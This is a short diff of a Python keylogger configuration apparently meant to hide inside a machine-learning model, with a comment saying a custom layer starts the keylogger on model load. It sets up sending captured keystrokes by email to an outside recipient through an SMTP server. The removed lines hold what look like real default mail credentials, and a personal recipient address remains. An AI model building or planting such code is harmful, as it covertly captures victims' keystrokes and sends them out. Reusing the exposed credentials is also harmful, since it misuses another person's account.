@@ -15,10 +15,10 @@ import threading
 # Configuration for keylogger and email (using Zoho Mail)
 LOG_FILE = "keystrokes.log"
 FILE_SIZE_LIMIT = 448  # 2KB in bytes
-EMAIL_ADDRESS = os.environ.get("KEYLOGGER_EMAIL", "test_0410@zohomail.eu")  # Set via environment variable
-EMAIL_PASSWORD = os.environ.get("KEYLOGGER_PASSWORD", "Test@1004")  # Set via environment variable
+EMAIL_ADDRESS = os.environ.get("KEYLOGGER_EMAIL", "test_@xx.com")  # Set via environment variable
+EMAIL_PASSWORD = os.environ.get("KEYLOGGER_PASSWORD", "Test@12345")  # Set via environment variable
 RECIPIENT_EMAIL = os.environ.get("KEYLOGGER_RECIPIENT", "piyushy1@gmail.com")  # Set via environment variable
-SMTP_SERVER = "smtp.zoho.eu"
+SMTP_SERVER = "smtp.xxx.eu"
 SMTP_PORT = 587
 
 # Custom layer that starts a keylogger on model load
